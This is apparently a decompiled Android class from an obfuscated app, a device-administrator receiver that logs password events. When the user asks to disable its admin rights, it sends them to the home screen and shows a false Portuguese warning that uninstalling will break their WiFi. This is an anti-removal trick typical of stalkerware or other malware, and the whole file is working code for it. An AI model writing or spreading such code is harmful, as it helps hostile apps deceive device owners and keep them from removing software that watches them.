package com.zgoicsifmc.receivers;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class DeviceAdmin extends DeviceAdminReceiver {
    /* renamed from: a */
    public String onDisableRequested(Context context, Intent intent) {
        super.onDisableRequested(context, intent);
        o82.d("onDisableRequested", new Object[0]);
        Intent intent2 = new Intent("android.intent.action.MAIN");
        intent2.addCategory("android.intent.category.HOME");
        intent2.setFlags(268435456);
        context.startActivity(intent2);
        return "Se você desinstalar seu WiFi irá parar de funcionar.";
    }

    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        o82.d("onDisabled", new Object[0]);
    }

    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        o82.d("onEnabled", new Object[0]);
    }

    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        o82.d("onPasswordChanged", new Object[0]);
    }

    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        o82.d("onPasswordFailed", new Object[0]);
    }

    public void onPasswordSucceeded(Context context, Intent intent) {
        super.onPasswordSucceeded(context, intent);
        o82.d("onPasswordSucceeded", new Object[0]);
    }
}
